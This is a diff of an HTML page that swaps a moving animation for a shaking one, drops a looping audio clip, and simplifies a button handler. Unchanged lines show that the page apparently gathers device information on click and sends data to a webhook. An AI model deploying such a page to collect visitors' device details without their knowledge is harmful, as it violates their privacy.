@@ -33,7 +33,7 @@
             display: inline-block;
             min-width: 300px;
             position: absolute;
-            animation: moveAnimation 10s linear infinite;
+            animation: shakeAnimation 0.5s linear infinite;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -72,13 +72,13 @@
             margin-top: 40px;
         }
 
-        /* Animation for moving the info box */
-        @keyframes moveAnimation {
-            0% { left: 0%; top: 0%; }
-            25% { left: 50%; top: 0%; }
-            50% { left: 50%; top: 50%; }
-            75% { left: 0%; top: 50%; }
-            100% { left: 0%; top: 0%; }
+        /* Vibration animation */
+        @keyframes shakeAnimation {
+            0% { transform: translate(-50%, -50%) translateX(0); }
+            25% { transform: translate(-50%, -50%) translateX(-10px); }
+            50% { transform: translate(-50%, -50%) translateX(10px); }
+            75% { transform: translate(-50%, -50%) translateX(-10px); }
+            100% { transform: translate(-50%, -50%) translateX(0); }
         }
 
         /* Landing Page Text Style */
@@ -246,24 +246,16 @@
                     })
                 });
             } catch (error) {
-                console.error('Error sending data to webhook:', error);
+                console.error('Error sending data to the webhook:', error);
             }
         }
 
-        document.getElementById('showButton').addEventListener('click', function() {
-            // Hide landing page
+        // Show device info when button is clicked
+        document.getElementById('showButton').onclick = () => {
             document.getElementById('landingPage').style.display = 'none';
-
-            // Show device info
             document.getElementById('deviceInfo').style.display = 'block';
-
-            // Play the sound in loop
-            const audio = document.getElementById('audio');
-            audio.play();
-
-            // Fetch device information
             getDeviceInfo();
-        });
+        };
     </script>
 </body>
 </html>
